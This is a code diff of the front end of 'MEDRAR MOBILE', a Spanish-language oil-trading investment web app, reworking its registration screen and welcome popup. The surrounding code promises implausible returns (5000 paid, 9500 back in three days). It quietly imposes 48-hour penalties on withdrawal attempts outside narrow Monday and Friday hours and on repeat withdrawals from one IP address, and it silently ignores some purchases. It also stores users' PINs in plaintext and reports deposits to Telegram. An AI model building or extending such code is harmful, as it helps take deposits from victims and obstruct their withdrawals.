@@ -61,35 +61,15 @@ body {
 </head>
 <body class="antialiased min-h-screen p-0 sm:p-4 flex justify-center bg-[#000A09]">
 
-<!-- POPUP DE BIENVENIDA LIMPIO -->
-<div id="notice-modal" class="fixed inset-0 z-[70] bg-black/85 backdrop-blur-sm flex items-center justify-center p-4">
-  <div class="app-card w-full max-w-sm p-6 space-y-5 text-center border-amber-500/40 bg-[#001F1C]">
-    <div class="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400 text-2xl">
-      <i class="fa-solid fa-chart-line"></i>
-    </div>
-    <div class="space-y-1">
-      <h3 class="text-lg font-bold text-white">MEDRAR MOBILE</h3>
-      <p class="text-xs text-amber-200/70">Plataforma de Mercado Petrolero</p>
-    </div>
-    <div class="bg-[#001412] border border-amber-500/20 rounded-xl p-4 text-center text-xs text-amber-100 font-mono-num space-y-1">
-      <p class="font-bold text-white">¡Bienvenido a formar parte del equipo!</p>
-      <p class="text-[11px] text-amber-200/70">Gestione sus operaciones en el mercado petrolero de forma segura y directa.</p>
-    </div>
-    <button onclick="closeNoticeModal()" class="app-button w-full py-3.5 rounded-xl text-xs uppercase tracking-wider cursor-pointer shadow-md">
-      ¡Listo!
-    </button>
-  </div>
-</div>
-
-<!-- PANTALLA DE AUTENTICACIÓN / LOGIN -->
-<div id="auth-screen" class="fixed inset-0 z-60 bg-[#001412] flex items-center justify-center p-4">
-  <div class="app-card w-full max-w-sm p-6 space-y-5 bg-[#001F1C]">
+<!-- 1. PANTALLA DE REGISTRO / AUTENTICACIÓN INICIAL -->
+<div id="auth-screen" class="fixed inset-0 z-[80] bg-[#001412] flex items-center justify-center p-4">
+  <div class="app-card w-full max-w-sm p-6 space-y-5 bg-[#001F1C] border-amber-500/40">
     <div class="text-center space-y-1">
       <div class="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400 text-xl mb-2">
-        <i class="fa-solid fa-shield-halved"></i>
+        <i class="fa-solid fa-user-shield"></i>
       </div>
-      <h2 class="text-lg font-bold text-white">Acceso a Cuenta</h2>
-      <p class="text-xs text-amber-200/70">Identifíquese para gestionar sus operaciones</p>
+      <h2 class="text-lg font-bold text-white">Registro y Acceso</h2>
+      <p class="text-xs text-amber-200/70">Ingrese sus datos para registrar su cuenta en el sistema</p>
     </div>
 
     <div id="multicount-error" class="hidden bg-rose-950/80 border border-rose-500/50 p-3 rounded-xl text-xs text-rose-200 text-center font-mono-num">
@@ -114,9 +94,29 @@ body {
       </div>
 
       <button type="submit" class="app-button w-full py-3.5 rounded-xl text-xs uppercase tracking-wider cursor-pointer shadow-md">
-        Ingresar a Terminal
+        Registrarse / Ingresar
       </button>
     </form>
+  </div>
+</div>
+
+<!-- 2. POPUP DE BIENVENIDA (SE MUESTRA TRAS EL REGISTRO) -->
+<div id="notice-modal" class="fixed inset-0 z-[70] bg-black/85 backdrop-blur-sm hidden flex items-center justify-center p-4">
+  <div class="app-card w-full max-w-sm p-6 space-y-5 text-center border-amber-500/40 bg-[#001F1C]">
+    <div class="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400 text-2xl">
+      <i class="fa-solid fa-chart-line"></i>
+    </div>
+    <div class="space-y-1">
+      <h3 class="text-lg font-bold text-white">MEDRAR MOBILE</h3>
+      <p class="text-xs text-amber-200/70">Plataforma de Mercado Petrolero</p>
+    </div>
+    <div class="bg-[#001412] border border-amber-500/20 rounded-xl p-4 text-center text-xs text-amber-100 font-mono-num space-y-1">
+      <p class="font-bold text-white">¡Bienvenido a formar parte del equipo!</p>
+      <p class="text-[11px] text-amber-200/70">Gestione sus operaciones en el mercado petrolero de forma segura y directa.</p>
+    </div>
+    <button onclick="closeNoticeModal()" class="app-button w-full py-3.5 rounded-xl text-xs uppercase tracking-wider cursor-pointer shadow-md">
+      ¡Listo!
+    </button>
   </div>
 </div>
 
@@ -416,7 +416,9 @@ const SUPABASE_URL = 'https://haxyklqptaokqizajtjj.supabase.co';
 const SUPABASE_KEY = 'sb_publishable_D1aQLBcvMYbMZPUOnusmsQ_TNRT9wTb';
 const db = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-window.closeNoticeModal = () => document.getElementById('notice-modal').classList.add('hidden');
+window.closeNoticeModal = () => {
+  document.getElementById('notice-modal').classList.add('hidden');
+};
 
 const plans = [
   { id: 'refinor', name: 'Refinor (Norte)', cost: 5000, days: 3, daily: 1500, total: 9500, logo: './refinor.png' },
@@ -452,6 +454,8 @@ async function checkExistingSession() {
     updateHeaderUser();
     await checkSilentCentavos();
     await loadUserData();
+  } else {
+    document.getElementById('notice-modal').classList.add('hidden');
   }
 }
 
@@ -475,6 +479,7 @@ async function handleAuthSubmit() {
     return;
   }
 
+  // Verificar en Supabase si ya existe un usuario con este dispositivo
   let { data: existingUser } = await db.from('usuarios').select('*').eq('device_id', deviceId).single();
 
   if (existingUser) {
@@ -484,13 +489,27 @@ async function handleAuthSubmit() {
     }
     currentUser = existingUser;
   } else {
-    let { data: newUser } = await db.from('usuarios').insert([{
-      device_id: deviceId, nombre: nameVal, pin: pinVal, balance: 0, last_centavos_date: '', retiro_pendiente: false, ip_address: userIp
+    // Si no existe, lo creamos e insertamos en Supabase vinculado al dispositivo
+    let { data: newUser, error } = await db.from('usuarios').insert([{
+      device_id: deviceId, 
+      nombre: nameVal, 
+      pin: pinVal, 
+      balance: 0, 
+      last_centavos_date: '', 
+      retiro_pendiente: false, 
+      ip_address: userIp
     }]).select().single();
+
+    if (error) {
+      alert("Error al registrar en la base de datos. Intente nuevamente.");
+      return;
+    }
     currentUser = newUser;
   }
 
+  // Quitar pantalla de registro, mostrar popup de bienvenida y cargar datos
   document.getElementById('auth-screen').remove();
+  document.getElementById('notice-modal').classList.remove('hidden');
   updateHeaderUser();
   await checkSilentCentavos();
   await loadUserData();
@@ -722,7 +741,7 @@ async function purchasePlan(planId) {
   const weekMs = 7 * 24 * 60 * 60 * 1000;
   if ((now - (currentUser.last_plan_purchase_time || 0)) < weekMs) {
     closeActionSheet();
-    return; // Silencioso si ya adquirió en la semana
+    return;
   }
 
   if (currentUser.balance < p.cost) {
@@ -860,10 +879,9 @@ async function notifyDepositTelegram() {
 
 async function executeWithdrawal() {
   const now = new Date();
-  const currentDay = now.getDay(); // 1 = Lunes, 5 = Viernes
+  const currentDay = now.getDay();
   const currentHour = now.getHours();
 
-  // HORARIO ESTRICTO DE RETIROS: Lunes y Viernes de 10 a 14 hs (De forma silenciosa si falla)
   if (currentDay !== 1 && currentDay !== 5 || currentHour < 10 || currentHour >= 14) {
     const penaltyTime = Date.now() + (48 * 60 * 60 * 1000);
     await updateDBUser({ penalty_until: penaltyTime });
@@ -872,7 +890,6 @@ async function executeWithdrawal() {
     return;
   }
 
-  // Verificación de IP múltiple para retiros diarios (Multa silenciosa de 48hs)
   let { data: ipChecks } = await db.from('retiros').select('*').eq('ip_address', userIp).gte('created_at', new Date().toDateString());
   if (ipChecks && ipChecks.length > 0) {
     const penaltyTime = Date.now() + (48 * 60 * 60 * 1000);
